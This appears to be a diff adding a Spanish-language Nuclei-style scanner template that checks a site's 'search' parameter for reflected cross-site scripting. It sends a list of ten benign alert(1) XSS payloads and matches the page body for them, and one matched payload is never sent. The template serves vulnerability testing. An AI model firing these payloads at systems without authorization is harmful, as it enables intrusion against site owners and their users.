@@ -1,0 +1,41 @@
+id: XSS-REFLEJADO
+
+info:
+  name: XSS Reflejado
+  author: Fabian Morales
+  severity: critical
+  description: "Prueba de XSS reflejado con múltiples vectores de ataque"
+  tags: xss, reflected
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?search=<script>alert(1)</script>"
+      - "{{BaseURL}}/?search=%3Cscript%3Ealert(1)%3C/script%3E"
+      - "{{BaseURL}}/?search=<svg onload=alert(1)>"
+      - "{{BaseURL}}/?search=<body onload=alert(1)>"
+      - "{{BaseURL}}/?search=<iframe src=javascript:alert(1)>"
+      - "{{BaseURL}}/?search=<a href=javascript:alert(1)>ClickMe</a>"
+      - "{{BaseURL}}/?search=<input value='XSS' onfocus=alert(1)>"
+      - "{{BaseURL}}/?search=<details open ontoggle=alert(1)>"
+      - "{{BaseURL}}/?search=<marquee onstart=alert(1)>"
+      - "{{BaseURL}}/?search=<math><mtext></mtext><mtext onmouseover=alert(1)>XSS</mtext></math>"
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror=alert(1)>"
+          - "<svg onload=alert(1)>"
+          - "<body onload=alert(1)>"
+          - "<iframe src=javascript:alert(1)>"
+          - "<a href=javascript:alert(1)>ClickMe</a>"
+          - "<input value='XSS' onfocus=alert(1)>"
+          - "<details open ontoggle=alert(1)>"
+          - "<marquee onstart=alert(1)>"
+          - "<math><mtext></mtext><mtext onmouseover=alert(1)>XSS</mtext></math>"
+        part: body
+        name: "Se logra ejecutar XSS con múltiples vectores"
+
+      - type: regex
+        regex:
+          - ".*?<svg onload=alert\\(1\\)>.*?"
